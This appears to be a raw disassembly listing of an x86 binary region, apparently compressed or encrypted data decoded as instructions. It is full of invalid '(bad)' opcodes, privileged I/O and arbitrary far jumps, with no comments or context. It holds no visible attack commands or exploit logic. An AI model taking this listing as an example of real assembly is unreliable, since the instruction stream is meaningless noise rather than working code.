  42a182:	cmp    bh,dh
  42a184:	push   es
  42a185:	mov    ch,0xf9
  42a187:	test   DWORD PTR [ebx],ecx
  42a189:	mov    al,0x58
  42a18b:	jnp    0x42a1ec
  42a18d:	enter  0xbb3e,0xe3
  42a191:	xchg   ebp,eax
  42a192:	test   edx,0x663263de
  42a198:	add    eax,0xca41025d
  42a19d:	inc    eax
  42a19e:	fwait
  42a19f:	xor    edx,DWORD PTR [edx+0x2e]
  42a1a2:	cld    
  42a1a3:	or     eax,0x30085216
  42a1a8:	mov    ebp,0x51d52db0
  42a1ad:	jg     0x42a18e
  42a1af:	mov    ecx,0x5ffbdebb
  42a1b4:	jmp    edx
  42a1b6:	aaa    
  42a1b7:	jle    0x42a1a2
  42a1b9:	adc    edi,DWORD PTR [ebx]
  42a1bb:	pop    ss
  42a1bc:	das    
  42a1bd:	xchg   esp,eax
  42a1be:	mov    DWORD PTR [ebp-0x2978efbb],edi
  42a1c4:	pop    ds
  42a1c5:	or     edi,edi
  42a1c7:	pop    ds
  42a1c8:	fs std 
  42a1ca:	mov    cl,0xb0
  42a1cc:	movlhps xmm5,xmm6
  42a1cf:	xchg   DWORD PTR [eax-0x4d270f3f],edi
  42a1d5:	jo     0x42a232
  42a1d7:	call   0xf8071a50
  42a1dc:	stc    
  42a1dd:	retf   
  42a1de:	pusha  
  42a1df:	or     ecx,DWORD PTR [edi+0xa6a9ed8]
  42a1e5:	pusha  
  42a1e6:	icebp  
  42a1e7:	and    dl,al
  42a1e9:	cdq    
  42a1ea:	xor    esp,DWORD PTR [edi-0x1c]
  42a1ed:	int3   
  42a1ee:	cdq    
  42a1ef:	xor    edi,ecx
  42a1f1:	clc    
  42a1f2:	icebp  
  42a1f3:	(bad)  
  42a1f4:	in     eax,dx
  42a1f5:	stos   DWORD PTR es:[edi],eax
  42a1f6:	scas   al,BYTE PTR es:[edi]
  42a1f7:	mov    edx,0x578f1fea
  42a1fc:	mov    esi,0xbb6687ed
  42a201:	int    0xff
  42a203:	xchg   ecx,eax
  42a204:	(bad)  
  42a205:	scas   al,BYTE PTR es:[edi]
  42a206:	(bad)  
  42a207:	(bad)  
  42a208:	push   cs
  42a209:	or     ebx,0x1c18920e
  42a20f:	mov    al,ds:0x262b3d56
  42a214:	rcl    BYTE PTR [ebp-0x65],1
  42a217:	mov    cl,0xa
  42a219:	inc    ebp
  42a21a:	in     eax,0x82
  42a21c:	repnz out dx,eax
  42a21e:	inc    ebp
  42a21f:	inc    edx
  42a220:	push   0xffffff8d
  42a222:	mov    BYTE PTR [ebx],ah
  42a224:	mov    DWORD PTR [ecx+0x1],esp
  42a227:	and    BYTE PTR [edx+eax*1-0x65],0xb
  42a22c:	pop    ds
  42a22d:	push   ebx
  42a22e:	inc    edx
  42a22f:	push   0x1d
  42a231:	mov    eax,0x2b51a022
  42a236:	xchg   ebx,eax
  42a237:	push   ebx
  42a238:	add    al,0x62
  42a23a:	mov    dl,0x46
  42a23c:	sbb    ch,al
  42a23e:	add    al,0xd4
  42a240:	cmp    BYTE PTR [edi-0x80],ah
  42a243:	pushf  
  42a244:	xchg   BYTE PTR [ecx],bl
  42a246:	lods   eax,DWORD PTR ds:[esi]
  42a247:	mov    al,ds:0x87291569
  42a24c:	gs or  bl,cl
  42a24f:	cmp    DWORD PTR [eax],esi
  42a251:	imul   esi,DWORD PTR [ebx+0x11],0x52446a95
  42a258:	push   cs
  42a259:	rcl    BYTE PTR [esi+0xf4b51a],0x88
  42a260:	jae    0x42a2e1
  42a262:	inc    ebp
  42a263:	cdq    
  42a264:	xchg   esp,eax
  42a265:	stos   DWORD PTR es:[edi],eax
  42a266:	das    
  42a267:	add    cl,al
  42a269:	(bad)  
  42a26a:	push   eax
  42a26b:	push   esp
  42a26c:	adc    al,0x89
  42a26e:	mov    edx,0xa29a282c
  42a273:	or     al,0x1a
  42a275:	and    eax,0x54047a82
  42a27a:	push   0x1
  42a27c:	or     BYTE PTR [ebx+eax*1+0x65811a5c],dl
  42a283:	add    al,0xce
  42a285:	push   ds
  42a286:	push   cs
  42a287:	add    DWORD PTR [edx+ecx*8-0x38f861aa],ecx
  42a28e:	add    BYTE PTR [edx-0x80],al
  42a291:	fdivr  QWORD PTR [edi+0x1c]
  42a294:	imul   esp,DWORD PTR [edi-0x7c],0x3d42346a
  42a29b:	or     ch,BYTE PTR [eax-0x66]
  42a29e:	push   ss
  42a29f:	shr    DWORD PTR [edx-0x2],1
  42a2a2:	imul   esp,DWORD PTR [eax],0x1c2a20e4
  42a2a8:	lods   eax,DWORD PTR ds:[esi]
  42a2a9:	fucom  st(5)
  42a2ab:	sub    bl,BYTE PTR [ecx+0x675dcec0]
  42a2b1:	mov    al,ds:0xb76c689f
  42a2b6:	sub    dl,0x5b
  42a2b9:	(bad)  
  42a2ba:	or     bl,0x40
  42a2bd:	pop    DWORD PTR [edx]
  42a2bf:	and    al,dl
  42a2c1:	fdivr  QWORD PTR [ebx+edx*4-0x15]
  42a2c5:	mov    ds:0x3368b2e3,al
  42a2ca:	pop    DWORD PTR [edx-0x9660983]
  42a2d0:	pop    ebp
  42a2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2d2:	out    0x77,eax
  42a2d4:	add    BYTE PTR [edi-0x2cd87a],al
  42a2da:	jno    0x42a2ab
  42a2dc:	mov    ebx,0xef7ff96e
  42a2e1:	jle    0x42a2de
  42a2e3:	pop    ebx
  42a2e4:	ss push edx
  42a2e6:	dec    edx
  42a2e7:	inc    ebx
  42a2e8:	xchg   esp,eax
  42a2e9:	mov    edi,0x4f45c97c
  42a2ee:	pusha  
  42a2ef:	sub    BYTE PTR [eax+0x5d2fb0b2],al
  42a2f5:	popa   
  42a2f6:	fcomip st,st(2)
  42a2f8:	mov    eax,0xa050ff08
  42a2fd:	imul   esp,ecx,0xc5b78b18
  42a303:	jecxz  0x42a368
  42a305:	loope  0x42a2f8
  42a307:	out    0xe5,eax
  42a309:	add    eax,0x4014d53c
  42a30e:	fstp   DWORD PTR [esi]
  42a310:	jno    0x42a344
  42a312:	aaa    
  42a313:	ss ss repnz (bad) 
  42a317:	(bad)  
  42a318:	push   esi
  42a319:	cmp    dh,BYTE PTR [ecx-0x1e]
  42a31c:	neg    DWORD PTR [esi-0x41]
  42a31f:	jbe    0x42a305
  42a321:	scas   eax,DWORD PTR es:[edi]
  42a322:	(bad)  
  42a323:	stc    
  42a324:	jl     0x42a39c
  42a326:	std    
  42a327:	iret   
  42a328:	iret   
  42a329:	ja     0x42a2c6
  42a32b:	addr16 out 0xb5,al
  42a32e:	xor    DWORD PTR [edx-0x3fde3740],ebp
  42a334:	add    DWORD PTR [si],0x8126296d
  42a33b:	dec    esi
  42a33c:	mov    al,ds:0x2d95c029
  42a341:	sbb    al,0x47
  42a343:	add    ah,dh
  42a345:	or     cl,dh
  42a347:	daa    
  42a348:	in     al,0xe8
  42a34a:	nop
  42a34b:	pop    esp
  42a34c:	(bad)  
  42a34d:	aam    0x61
  42a34f:	retf   0x195d
  42a352:	sub    DWORD PTR [ebx+0x4a8e45a1],ebp
  42a358:	sub    BYTE PTR [edx+0x729ebea2],dl
  42a35e:	push   edx
  42a35f:	shl    BYTE PTR [eax],0x67
  42a362:	jne    0x42a3e1
  42a364:	int    0x31
  42a366:	fs jbe 0x42a3b3
  42a369:	mov    BYTE PTR [ecx],ah
  42a36b:	xor    BYTE PTR [edx+eax*1],0xc7
  42a36f:	or     al,0xb1
  42a371:	cmp    al,0x3b
  42a373:	ins    BYTE PTR es:[edi],dx
  42a374:	jo     0x42a39d
  42a376:	mov    al,ah
  42a378:	pop    esp
  42a379:	add    eax,0xa00402f5
  42a37e:	add    BYTE PTR [edx+eax*1+0x7],0xaf
  42a383:	push   ebp
  42a384:	adc    eax,0xffffffec
  42a387:	inc    ecx
  42a388:	mov    fs,WORD PTR [edx-0x4bf8410f]
  42a38e:	and    ecx,ecx
  42a390:	(bad)  
  42a391:	mov    BYTE PTR [esi],al
  42a393:	clc    
  42a394:	add    BYTE PTR [eax+eiz*4+0x4c34484],cl
  42a39b:	jo     0x42a384
  42a39d:	cs mov bl,0x71
  42a3a0:	jge    0x42a333
  42a3a2:	nop
  42a3a3:	mov    dl,0x10
  42a3a5:	lds    esi,FWORD PTR [ecx]
  42a3a7:	fsub   st(6),st
  42a3a9:	sub    bh,ah
  42a3ab:	test   eax,0x46a681eb
  42a3b0:	cdq    
  42a3b1:	cmc    
  42a3b2:	inc    edi
  42a3b3:	inc    esp
  42a3b4:	inc    eax
  42a3b5:	or     al,BYTE PTR [eax+0x64]
  42a3b8:	dec    eax
  42a3b9:	sbb    eax,DWORD PTR [eax+0x31e48196]
  42a3bf:	pop    ecx
  42a3c0:	pop    ebp
  42a3c1:	sub    DWORD PTR [edi+0x51b6621c],0xde4ea062
  42a3cb:	add    BYTE PTR [ebp+0x45],0x80
  42a3cf:	std    
  42a3d0:	push   0x554ba83e
  42a3d5:	cmp    al,BYTE PTR [ebx]
  42a3d7:	(bad)  
  42a3d8:	mov    esp,0x14f0dd77
  42a3dd:	addr16 sbb bh,0x11
  42a3e1:	xchg   BYTE PTR [edx+esi*1],cl
  42a3e4:	or     BYTE PTR [edx+0x4e],cl
  42a3e7:	stos   BYTE PTR es:[edi],al
  42a3e8:	add    eax,0x67f5653e
  42a3ed:	add    BYTE PTR [ecx],ch
  42a3ef:	adc    edx,DWORD PTR [edx-0x6a82979c]
  42a3f5:	hlt    
  42a3f6:	sub    DWORD PTR [eax+0x0],eax
  42a3f9:	ror    DWORD PTR [ebx],cl
  42a3fb:	cmp    esp,eax
  42a3fd:	adc    eax,0xfa73b33e
  42a402:	adc    ebp,DWORD PTR [edi-0x3]
  42a405:	les    ebx,FWORD PTR [ebx-0x18fc1a81]
  42a40b:	ds jns 0x42a3f5
  42a40e:	out    dx,al
  42a40f:	inc    eax
  42a410:	imul   BYTE PTR [edi-0x4df0aa9c]
  42a416:	aam    0x43
  42a418:	outs   dx,DWORD PTR ds:[esi]
  42a419:	add    al,ch
  42a41b:	test   DWORD PTR [esi+eax*1-0x1],ebx
  42a41f:	retf   
  42a420:	loopne 0x42a3db
  42a422:	gs inc edx
  42a424:	mov    esi,0xf20fed68
  42a429:	sub    bh,BYTE PTR [esi-0x23c054e0]
  42a42f:	sahf   
  42a430:	stos   BYTE PTR es:[edi],al
  42a431:	or     al,BYTE PTR [eax]
  42a433:	fdivr  DWORD PTR [edi-0x3e]
  42a436:	add    BYTE PTR [eax+0x70f6f6f6],al
  42a43c:	repnz in al,0xc9
  42a43f:	cmp    al,0xbe
  42a441:	clc    
  42a442:	scas   al,BYTE PTR es:[edi]
  42a443:	mov    ebx,0xe6b91f0f
  42a448:	pop    ds
  42a449:	mov    cs,WORD PTR [edi]
  42a44b:	mov    ebp,0xb7ce5fe2
  42a450:	in     eax,0xef
  42a452:	out    0x51,al
  42a454:	in     eax,dx
  42a455:	jl     0x42a3f4
  42a457:	nop
  42a458:	inc    ebx
  42a459:	or     BYTE PTR [ebx+0x5e],0xbb
  42a45d:	or     dh,BYTE PTR [ebx-0x4f9c77d]
  42a463:	lods   al,BYTE PTR ds:[esi]
  42a464:	arpl   WORD PTR [eax-0x5fea3e94],si
  42a46a:	(bad)
  42a46e:	loopne 0x42a4b4
  42a470:	pop    es
  42a471:	bound  esp,QWORD PTR [esi-0x58af8b64]
  42a477:	pop    eax
  42a478:	out    0x0,al
  42a47a:	rcr    BYTE PTR [edx],1
  42a47c:	jle    0x42a4df
  42a47e:	mov    BYTE PTR [eax],dl
  42a480:	bound  edi,QWORD PTR [ebx]
  42a482:	inc    ebx
  42a483:	into   
  42a484:	adc    DWORD PTR [ecx],esi
  42a486:	inc    ebp
  42a487:	adc    BYTE PTR [edx],dh
  42a489:	mov    BYTE PTR [ebx+0x2064b536],al
  42a48f:	mov    ch,0x2d
  42a491:	pop    edx
  42a492:	and    bh,BYTE PTR [eax+0x8]
  42a495:	sbb    al,0x2a
  42a497:	rcl    ch,0x66
  42a49a:	jmp    0xbb5f54a7
  42a49f:	dec    esi
  42a4a0:	sub    al,0xd1
  42a4a2:	fld    DWORD PTR [eax+0x6dae6f04]
  42a4a8:	or     esi,ecx
  42a4aa:	or     al,0x2f
  42a4ac:	dec    esi
  42a4ad:	test   eax,0x624085c4
  42a4b2:	xchg   ebx,eax
  42a4b3:	adc    DWORD PTR [eax+eax*8-0x6a],eax
  42a4b7:	retf   
  42a4b8:	mov    bh,0x10
  42a4ba:	pop    edi
  42a4bb:	add    eax,0xc403b8c8
  42a4c0:	inc    ebx
  42a4c1:	jecxz  0x42a53c
  42a4c3:	xchg   ebp,eax
  42a4c4:	inc    esp
  42a4c5:	ins    DWORD PTR es:[edi],dx
  42a4c6:	std    
  42a4c7:	test   esi,edx
  42a4c9:	lock mov ebx,0x5bda0c66
  42a4cf:	inc    ebp
  42a4d0:	cmc    
  42a4d1:	shl    ch,1
  42a4d3:	loopne 0x42a4c2
  42a4d5:	xor    eax,0xaa30ac50
  42a4da:	sbb    ah,BYTE PTR es:[edi-0x5b42dd59]
  42a4e1:	jmp    0x6e8fc27
  42a4e6:	sub    edi,ecx
  42a4e8:	shr    BYTE PTR [esi+edx*8+0x6a],0x9f
  42a4ed:	test   DWORD PTR [eax+0x52a5e27],ebx
  42a4f3:	in     eax,dx
  42a4f4:	out    0x74,eax
  42a4f6:	jp     0x42a560
  42a4f8:	sub    BYTE PTR [ebp+0x13],0x97
  42a4fc:	dec    ecx
  42a4fd:	cmp    al,0xae
  42a4ff:	pop    ds
  42a500:	lock inc ecx
  42a502:	test   DWORD PTR [ebx-0x6f],ebx
  42a505:	push   es
  42a506:	out    0xc2,eax
  42a508:	lods   al,BYTE PTR ds:[esi]
  42a509:	cmp    al,0x97
  42a50b:	mov    bh,BYTE PTR [esi]
  42a50d:	cmp    eax,DWORD PTR [esi-0x29]
  42a510:	mov    edi,0x22b44faf
  42a515:	popf   
  42a516:	stos   DWORD PTR es:[edi],eax
  42a517:	lahf   
  42a518:	push   eax
  42a519:	js     0x42a52f
  42a51b:	hlt    
  42a51c:	cmp    ecx,DWORD PTR [edi-0x31]
  42a51f:	out    dx,eax
  42a520:	sbb    BYTE PTR [eax*2+0x78ef6937],0xe0
  42a528:	std    
  42a529:	outs   dx,DWORD PTR ds:[esi]
  42a52a:	mov    esi,0xfbbf93e5
  42a52f:	mov    BYTE PTR [edi],0x67
  42a532:	mov    ebx,0x3fab433b
  42a537:	adc    al,0xae
  42a539:	adc    dh,BYTE PTR [edi+0x2f]
  42a53c:	pop    edx
  42a53d:	stc    
  42a53e:	bnd jno 0x42a4cc
  42a541:	cs jns 0x42a5a2
  42a544:	js     0x42a5c3
  42a546:	js     0x42a504
  42a548:	add    bh,BYTE PTR gs:[ebx+0x25]
  42a54c:	stos   DWORD PTR es:[edi],eax
  42a54d:	mov    edi,0xfff0fcf8
  42a552:	das    
  42a553:	mov    dh,al
  42a555:	add    ecx,DWORD PTR [edi+0x6d]
  42a558:	add    eax,0x93badc30
  42a55d:	cmp    BYTE PTR [ebx-0x64c99b33],bl
  42a563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a564:	popf   
  42a565:	popf   
  42a566:	popf   
  42a567:	fabs   
  42a569:	in     eax,dx
  42a56a:	(bad)  
  42a56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a56d:	arpl   di,dx
  42a56f:	mov    esi,0xf362cfec
  42a574:	adc    eax,0x4bdf363f
  42a579:	mov    edi,0x3e702687
  42a57f:	ret    0x8f27
  42a582:	push   eax
  42a583:	jns    0x42a50d
  42a585:	cmp    BYTE PTR [eax+0x76],cl
  42a588:	nop
  42a589:	and    BYTE PTR [esi+0x15],ah
  42a58c:	sti    
  42a58d:	leave  
  42a58e:	mov    cl,0x5d
  42a590:	add    eax,0x7b48a01a
  42a595:	and    ah,BYTE PTR [eax-0x2c25327e]
  42a59b:	je     0x42a53d
  42a59d:	arpl   WORD PTR [edi+0x1b53f4a2],cx
  42a5a3:	adc    DWORD PTR [ebx+0x63],esi
  42a5a6:	mov    ds:0x9cc04b0,eax
  42a5ab:	sub    DWORD PTR [ebx],ebp
  42a5ad:	outs   dx,DWORD PTR ds:[esi]
  42a5ae:	add    DWORD PTR [ebx+0x36],ecx
  42a5b1:	xlat   BYTE PTR ds:[ebx]
  42a5b2:	mov    esi,0x1c877905
  42a5b7:	and    ecx,eax
  42a5b9:	cmp    DWORD PTR [eax-0x7296fff1],esi
  42a5bf:	and    BYTE PTR [esi+0x79241cc5],0x64
  42a5c6:	mov    DWORD PTR [eax+0x69],esp
  42a5c9:	inc    eax
  42a5ca:	test   al,0x21
  42a5cc:	xchg   esp,eax
  42a5cd:	nop
  42a5ce:	inc    esp
  42a5cf:	ror    ch,1
  42a5d1:	shl    BYTE PTR [ebx-0x5ba4ac1d],cl
  42a5d7:	or     edi,DWORD PTR ds:0x54266b0
  42a5dd:	push   edx
  42a5de:	call   0xc3a0:0x810ac02e
  42a5e5:	ds pushf 
  42a5e7:	add    al,0xb8
  42a5e9:	stc    
  42a5ea:	add    al,0xbc
  42a5ec:	jno    0x42a61b
  42a5ee:	fdivr  QWORD PTR [ecx+0x15dde063]
  42a5f4:	mov    esp,?
  42a5f6:	mov    dl,BYTE PTR [esi+0x52]
  42a5f9:	mov    dl,0x43
  42a5fb:	cmp    esi,DWORD PTR [edi]
  42a5fd:	mov    esp,0x906b078a
  42a602:	adc    bl,dl
  42a604:	and    al,0x40
  42a606:	mov    cs,edx
  42a608:	inc    esp
  42a609:	fs adc al,0xe7
  42a60c:	test   DWORD PTR [ebx+eax*2-0x1b],edx
  42a610:	dec    esi
  42a611:	inc    ebx
  42a612:	mov    ss,edx
  42a614:	xchg   ebx,eax
  42a615:	scas   eax,DWORD PTR es:[edi]
  42a616:	lahf   
  42a617:	outs   dx,DWORD PTR ds:[esi]
  42a618:	fmul   DWORD PTR [edx]
  42a61a:	adc    ecx,eax
  42a61c:	stc    
  42a61d:	dec    esi
  42a61e:	lock mov ecx,0xb7d2fe1b
  42a624:	pop    ss
  42a625:	xchg   edi,eax
  42a626:	mov    ds:0x8e0192b,al
  42a62b:	sar    BYTE PTR [ecx+0x333bfa15],cl
  42a631:	mov    eax,ds:0xf768fa13
  42a636:	popf   
  42a637:	aad    0x2f
  42a639:	inc    DWORD PTR cs:[ebp-0x447647e3]
  42a640:	mov    eax,0xefd771b3
  42a645:	jg     0x42a631
  42a647:	ins    DWORD PTR es:[edi],dx
  42a648:	jmp    ebp
  42a64a:	std    
  42a64b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a64c:	ds jp  0x42a62a
  42a64f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a650:	and    eax,0x48f03f2e
  42a655:	loope  0x42a6b5
  42a657:	adc    al,0xf4
  42a659:	loope  0x42a63e
  42a65b:	loope  0x42a677
  42a65d:	sbb    edi,DWORD PTR [esi]
  42a65f:	pop    esi
  42a660:	xchg   BYTE PTR ds:0xaf36b41c,bl
  42a666:	adc    al,0x6
  42a668:	pusha  
  42a669:	loope  0x42a65c
  42a66b:	pop    ss
  42a66c:	jne    0x42a669
  42a66e:	stos   DWORD PTR es:[edi],eax
  42a66f:	mov    ds:0xb0351600,al
  42a674:	mov    ah,0x6d
  42a676:	sub    edx,DWORD PTR [edi-0x2c75a2d2]
  42a67c:	jmp    0x5d9dc62e
  42a681:	std    
  42a682:	lock aas 
  42a684:	pop    ebx
  42a685:	mov    edi,0xc0fcefea
  42a68a:	je     0x42a617
  42a68c:	dec    BYTE PTR [esi]
  42a68e:	xchg   ecx,eax
  42a68f:	clc    
  42a690:	shr    edx,1
  42a692:	or     dh,BYTE PTR [edx+0x4a]
  42a695:	lock mov eax,ds:0x2e19f382
  42a69b:	sub    ebp,DWORD PTR [eax]
  42a69d:	call   0x172ea9bf
  42a6a2:	push   ss
  42a6a3:	es cmc 
  42a6a5:	dec    edx
  42a6a6:	add    BYTE PTR [eax],0x66
  42a6a9:	add    ebx,ebp
  42a6ab:	and    BYTE PTR [eax+0x22490146],ch
  42a6b1:	pop    esp
  42a6b2:	dec    eax
  42a6b3:	nop
  42a6b4:	test   al,0x0
  42a6b6:	bound  esi,QWORD PTR [ecx-0x29]
  42a6b9:	lds    eax,FWORD PTR [esi]
  42a6bb:	sbb    eax,0xc9c11ce7
  42a6c0:	sbb    esp,DWORD PTR [ebp-0x29]
  42a6c3:	or     BYTE PTR [esi+0x5ae48468],dl
  42a6c9:	sub    ebp,edx
  42a6cb:	cmp    eax,0x103f6290
  42a6d0:	add    esp,DWORD PTR [eax]
  42a6d2:	js     0x42a67b
  42a6d4:	jno    0x42a692
  42a6d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6d7:	add    al,0xc2
  42a6d9:	or     BYTE PTR [eax+0x9],dh
  42a6dc:	sbb    edx,ebx
  42a6de:	iret   
  42a6df:	adc    BYTE PTR [ebp+0x1d234705],ah
  42a6e5:	imul   esp,DWORD PTR [ebx+eiz*8-0x5afdd40d],0x619c7c53
  42a6f0:	punpckhdq mm6,mm1
  42a6f3:	or     DWORD PTR [esi],ebx
  42a6f5:	sahf   
  42a6f6:	cmp    al,0x28
  42a6f8:	aad    0x70
  42a6fa:	mov    ebx,0x1d2ee087
  42a6ff:	inc    ebp
  42a700:	fstp   QWORD PTR [edx+eax*4]
  42a703:	out    0x11,eax
  42a705:	cwde   
  42a706:	sub    ebp,DWORD PTR ds:0xf28d4de1
  42a70c:	adc    eax,edx
  42a70e:	retf   0x5924
  42a711:	cmp    eax,0x38e91007
  42a716:	pop    esp
  42a717:	and    dl,BYTE PTR [eax]
  42a719:	daa    
  42a71a:	lds    ecx,FWORD PTR ds:0x295f454a
  42a720:	loop   0x42a783
  42a722:	jmp    0x57b5:0xd589f17a
  42a729:	pusha  
  42a72a:	push   ebp
  42a72b:	imul   ebx,DWORD PTR [ecx],0x4a
  42a72e:	ins    BYTE PTR es:[edi],dx
  42a72f:	pop    edi
  42a730:	js     0x42a741
  42a732:	retf   
  42a733:	call   0x164e6ca6
  42a738:	retf   0xcd81
  42a73b:	call   0x5b7:0xf153316b
  42a742:	dec    ecx
  42a743:	mov    ah,0x9a
  42a745:	scas   eax,DWORD PTR es:[edi]
  42a746:	push   esp
  42a747:	inc    esp
  42a748:	dec    ebx
  42a749:	add    ecx,edi
  42a74b:	add    BYTE PTR [edi+ebp*1-0x12],cl
  42a74f:	add    DWORD PTR [eax+ecx*2+0x4fb1fa7e],ecx
  42a756:	push   edi
  42a758:	fistp  QWORD PTR [ecx-0x2d]
  42a75b:	jge    0x42a7dc
  42a75d:	lock mov dh,0x87
  42a760:	div    DWORD PTR [esi-0x2013a4ca]
  42a766:	push   ss
  42a767:	jecxz  0x42a75f
  42a769:	loope  0x42a74e
  42a76b:	sub    ecx,DWORD PTR [ecx]
  42a76d:	fbstp  TBYTE PTR [edx]
  42a76f:	mov    edi,DWORD PTR [ebp+eiz*1+0x2b]
  42a773:	pop    ebp
  42a774:	cld    
  42a775:	lahf   
  42a776:	jl     0x42a738
  42a778:	jmp    0x42a75f
  42a77a:	mov    ebx,0xd17fde2c
  42a77f:	lods   al,BYTE PTR ds:[esi]
  42a780:	(bad)  
  42a781:	jo     0x42a7fe
  42a783:	sub    ch,BYTE PTR [ebx]
  42a785:	add    ch,0x13
  42a788:	test   BYTE PTR [eax-0x6739d268],0x77
  42a78f:	jbe    0x42a807
  42a791:	shr    BYTE PTR [esi+esi*1-0x65],cl
  42a795:	into   
  42a796:	outs   dx,WORD PTR ds:[esi]
  42a798:	mov    esi,0xafb1c8e5
  42a79d:	(bad)  
  42a79e:	pusha  
  42a79f:	cwde   
  42a7a0:	mov    esp,0x2ef707f8
  42a7a5:	outs   dx,DWORD PTR ds:[esi]
  42a7a6:	fist   WORD PTR [edi+ebp*4-0x73]
  42a7aa:	adc    BYTE PTR [ebx+eax*8],ah
  42a7ad:	and    eax,0x113a8f86
  42a7b2:	ss sbb edi,ebx
  42a7b5:	ds (bad) 
  42a7b8:	push   edi
  42a7b9:	cmp    al,BYTE PTR [ebx]
  42a7bb:	push   ebx
  42a7bc:	sub    BYTE PTR [eax],0x53
  42a7bf:	push   cs
  42a7c0:	sub    al,0xb0
  42a7c2:	stc    
  42a7c3:	jg     0x42a805
  42a7c5:	push   ebx
  42a7c6:	adc    ebp,DWORD PTR [eax]
  42a7c8:	cmp    DWORD PTR [eax+0x4c94844],edi
  42a7ce:	cmp    al,0x65
  42a7d0:	inc    esp
  42a7d1:	adc    al,al
  42a7d3:	cmp    BYTE PTR [bx+0x39],ch
  42a7d7:	jge    0x42a7db
  42a7d9:	and    al,0x9
  42a7db:	cmp    BYTE PTR [ebx+ecx*8],ah
  42a7de:	adc    al,0xd4
  42a7e0:	and    BYTE PTR [ecx-0x6a],cl
  42a7e3:	shl    edi,cl
  42a7e5:	adc    BYTE PTR [ecx+0x10],ah
  42a7e8:	adc    eax,0x2e5142ef
  42a7ed:	mov    cl,0xae
  42a7ef:	cmp    al,0x61
  42a7f1:	inc    eax
  42a7f2:	push   edx
  42a7f3:	and    BYTE PTR [ebx-0x71],0xec
  42a7f7:	inc    esp
  42a7f8:	mov    ebp,0xfa6b001
  42a7fd:	mov    ebx,0xfcc6be3c
  42a802:	push   cs
  42a803:	inc    ecx
  42a804:	pop    es
  42a805:	data16 mov dl,bl
  42a808:	je     0x42a828
  42a80a:	jns    0x42a7bc
  42a80c:	push   esp
  42a80d:	jo     0x42a7dc
  42a80f:	or     dh,BYTE PTR [eax-0xf]
  42a812:	adc    ah,bl
  42a814:	mov    esp,0x2c854b06
  42a819:	mov    WORD PTR [esi-0x2a],fs
  42a81c:	push   0x86494c3
  42a821:	retf   0x2d28
  42a824:	lds    edi,FWORD PTR [eax]
  42a826:	enter  0x8958,0x88
  42a82a:	pushf  
  42a82b:	call   0x81e0:0xb0d82130
  42a832:	(bad)  
  42a833:	in     al,dx
  42a834:	test   eax,0x6b5bd9cf
  42a839:	mov    cl,0x53
  42a83b:	push   eax
  42a83c:	mov    dl,0x8c
  42a83e:	pop    ebx
  42a83f:	out    dx,eax
  42a840:	loop   0x42a8bb
  42a842:	sbb    BYTE PTR [ebx],dl
  42a844:	xor    BYTE PTR [edx+0x79],cl
  42a847:	outs   dx,DWORD PTR ds:[esi]
  42a848:	mov    ecx,0x13600637
  42a84d:	jle    0x42a7d0
  42a84f:	adc    eax,0xe5231164
  42a854:	mov    WORD PTR [eax+0x308d868d],ds
  42a85a:	lock or al,0x4c
  42a85d:	lock add eax,edi
  42a860:	push   ebp
  42a861:	fidivr DWORD PTR [eax]
  42a863:	ja     0x42a84c
  42a865:	pop    es
  42a866:	(bad)  
  42a867:	mov    edi,0xf5ef7fbb
  42a86c:	mov    bh,0x9d
  42a86e:	mov    edi,0x94edeeef
  42a873:	shl    BYTE PTR [eax],cl
  42a875:	ss aaa 
  42a877:	lods   eax,DWORD PTR ds:[esi]
  42a878:	mov    dh,0x6f
  42a87a:	lea    ecx,[ebx*8+0x8eb65f6]
  42a881:	cmp    ebp,0x16
  42a884:	xchg   ebp,eax
  42a885:	lds    esi,FWORD PTR [edx-0x7f0ef11d]
  42a88b:	inc    ebp
  42a88c:	in     eax,0x30
  42a88e:	cld    
  42a88f:	lods   al,BYTE PTR ds:[esi]
  42a890:	gs in  eax,0xbe
  42a893:	(bad)
  42a897:	push   ebx
  42a898:	add    BYTE PTR [ebx-0x361d2452],cl
  42a89e:	sbb    al,0x9e
  42a8a0:	in     al,0xae
  42a8a2:	push   ss
  42a8a3:	cmp    eax,esi
  42a8a5:	cwde   
  42a8a6:	cs pop edi
  42a8a8:	mov    esi,0x7dedecdc
  42a8ad:	clc    
  42a8ae:	xor    edx,DWORD PTR [ebx-0x11006237]
  42a8b4:	fdiv   st,st(1)
  42a8b6:	outs   dx,DWORD PTR ds:[esi]
  42a8b7:	jns    0x42a912
  42a8b9:	mov    ebx,0xe7abe377
  42a8be:	fcmovnbe st,st(3)
  42a8c0:	mov    ch,0xf1
  42a8c2:	loope  0x42a919
  42a8c4:	and    al,0x9f
  42a8c6:	xchg   ecx,eax
  42a8c7:	mov    dl,0x87
  42a8c9:	dec    edi
  42a8ca:	outs   dx,BYTE PTR ds:[esi]
  42a8cb:	add    BYTE PTR [ecx+ecx*4+0x72],cl
  42a8cf:	repz cmp eax,DWORD PTR [esi+0x26]
  42a8d3:	xchg   bl,ah
  42a8d5:	ret    0xd021
  42a8d8:	bswap  ebp
  42a8da:	sub    BYTE PTR [esi-0x7d],dh
  42a8dd:	mov    ds:0xa4e5f64e,eax
  42a8e2:	or     al,0x3c
  42a8e4:	and    BYTE PTR ds:0xc8c82e5d,bl
  42a8ea:	lods   eax,DWORD PTR ds:[esi]
  42a8eb:	mov    ds,WORD PTR ds:0x46c9b787
  42a8f1:	add    eax,esi
  42a8f3:	sub    DWORD PTR [ecx],esp
  42a8f5:	push   edi
  42a8f6:	or     BYTE PTR [edi+0x19],0x12
  42a8fa:	cmp    al,0x88
  42a8fc:	adc    esp,DWORD PTR [esp+eax*1]
  42a8ff:	mov    bl,0xaa
  42a901:	pop    edx
  42a902:	add    al,0x94
  42a904:	sbb    al,cl
  42a906:	cmp    al,0x43
  42a908:	and    ax,0xa735
  42a90c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a90d:	lds    eax,FWORD PTR [ebx-0x2e]
  42a910:	es add edi,ecx
  42a913:	mov    esp,cs
  42a915:	adc    ch,BYTE PTR [ecx+esi*4-0x56a3cf46]
  42a91c:	out    0x13,al
  42a91e:	pop    es
  42a91f:	xchg   DWORD PTR [edx+0x5b],ebx
